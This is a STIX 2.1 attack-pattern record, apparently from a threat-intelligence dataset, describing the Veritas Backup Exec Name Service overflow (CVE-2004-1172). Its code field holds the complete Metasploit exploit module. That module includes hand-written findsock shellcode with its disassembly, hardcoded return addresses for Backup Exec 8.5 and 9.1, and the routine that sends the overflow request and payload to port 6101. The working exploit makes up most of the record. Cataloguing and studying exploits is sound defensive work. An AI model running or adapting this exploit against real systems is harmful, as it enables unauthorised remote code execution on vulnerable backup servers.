{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--342abc58-d43c-421a-9a0f-ebaadf5ce172",
    "created": "2024-08-14T16:50:17.02613Z",
    "modified": "2024-08-14T16:50:17.026134Z",
    "name": "Veritas Backup Exec Name Service Overflow",
    "description": " This module exploits a vulnerability in the Veritas Backup Exec Agent Browser service. This vulnerability occurs when a recv() call has a length value too long for the\tdestination stack buffer. By sending an agent name value of 63 bytes or more, we can overwrite the return address of the recv function. Since we only have ~60 bytes of contiguous space for shellcode, a tiny findsock payload is sent which uses a hardcoded IAT address for the recv() function. This payload will then roll the stack back to the beginning of the page recv() the real shellcode into it, and jump to it. This module has been tested against Veritas 9.1 SP0, 9.1 SP1, and 8.6. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/backupexec/name_service.rb",
            "external_id": "name_service.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-1172"
        },
        {
            "source_name": "reference",
            "url": "http://www.idefense.com/application/poi/display?id=169&type=vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Veritas Backup Exec Name Service Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability in the Veritas Backup\n        Exec Agent Browser service. This vulnerability occurs when a\n        recv() call has a length value too long for the\tdestination\n        stack buffer. By sending an agent name value of 63 bytes or\n        more, we can overwrite the return address of the recv\n        function. Since we only have ~60 bytes of contiguous space\n        for shellcode, a tiny findsock payload is sent which uses a\n        hardcoded IAT address for the recv() function. This payload\n        will then roll the stack back to the beginning of the page,\n        recv() the real shellcode into it, and jump to it. This\n        module has been tested against Veritas 9.1 SP0, 9.1 SP1, and\n        8.6.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-1172'],\n          [ 'OSVDB', '12418'],\n          [ 'BID', '11974'],\n          [ 'URL', 'http://www.idefense.com/application/poi/display?id=169&type=vulnerabilities'],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'MinNops'  => 512,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => %w{ win },\n      'Targets'        =>\n        [\n          [\n            'Veritas BE 9.1 SP0/SP1', # BackupExec 9.1 SP0/SP1 return contributed by class101\n            {\n              'Platform' => 'win',\n              'Rets'     => [ 0x0142ffa1, 0x401150FF ], # recv@bnetns.exe v9.1.4691.0 | esi@bnetns.exe\n            },\n          ],\n          [\n            'Veritas BE 8.5',\n            {\n              'Platform' => 'win',\n              'Rets'     => [ 0x014308b9, 0x401138FF ], # recv@bnetns.exe v8.50.3572 | esi@beclass.dll v8.50.3572\n            },\n          ],\n        ],\n      'DisclosureDate' => '2004-12-16',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(6101)\n      ])\n  end\n\n  def exploit\n    connect\n\n    print_status(\"Trying target #{target.name}...\")\n\n    # This will findsock/read the real shellcode (51 bytes, harcoded IAT for recv)\n    # The IAT for recv() is for bnetns, the address is shifted by 8 bits to avoid\n    # nulls: [0x00401150 -> 0x401150FF]\n    stage_code = \"\\xfc\" * 112\n    stage_read =\n      \"\\x31\\xf6\\xc1\\xec\\x0c\\xc1\\xe4\\x0c\\x89\\xe7\\x89\\xfb\\x6a\\x01\\x8b\\x74\"+\n      \"\\x24\\xfe\\x31\\xd2\\x52\\x42\\xc1\\xe2\\x10\\x52\\x57\\x56\\xb8\\xff\\x50\\x11\"+\n      \"\\x40\\xc1\\xe8\\x08\\xff\\x10\\x85\\xc0\\x79\\x07\\x89\\xdc\\x4e\\x85\\xf6\\x75\"\n\n    # Configure the IAT for the recv call\n    stage_read[29, 4] = [ target['Rets'][1] ].pack('V')\n\n    # Stuff it all into one request\n    stage_code[2, stage_read.length] = stage_read\n\n    # Create the registration request\n    req =\n      \"\\x02\\x00\\x32\\x00\\x20\\x00\" + stage_code + \"\\x00\"+\n      \"1.1.1.1.1.1\\x00\" + \"\\xeb\\x81\"\n\n    print_status(\"Sending the agent registration request of #{req.length} bytes...\")\n    sock.put(req)\n\n    print_status(\"Sending the payload stage down the socket...\")\n    sock.put(payload.encoded)\n\n    print_status(\"Waiting for the payload to execute...\")\n    select(nil,nil,nil,2)\n\n    handler\n    disconnect\n  end\nend\n\n\n__END__\n[ findsock stage ]\n00000000  31F6              xor esi,esi\n00000002  C1EC0C            shr esp,0xc\n00000005  C1E40C            shl esp,0xc\n00000008  89E7              mov edi,esp\n0000000A  89FB              mov ebx,edi\n0000000C  6A01              push byte +0x1\n0000000E  8B7424FE          mov esi,[esp-0x2]\n00000012  31D2              xor edx,edx\n00000014  52                push edx\n00000015  42                inc edx\n00000016  C1E210            shl edx,0x10\n00000019  52                push edx\n0000001A  57                push edi\n0000001B  56                push esi\n0000001C  B8FF501140        mov eax,0x401150ff\n00000021  C1E808            shr eax,0x8\n00000024  FF10              call near [eax]\n00000026  85C0              test eax,eax\n00000028  7907              jns 0x31\n0000002A  89DC              mov esp,ebx\n0000002C  4E                dec esi\n0000002D  85F6              test esi,esi\n0000002F  75E1              jnz 0x12\n00000031  FFD7              call edi\n",
    "x_mitre_disclosure_date": "2004-12-16",
    "x_mitre_platforms": [
        "win'"
    ]
}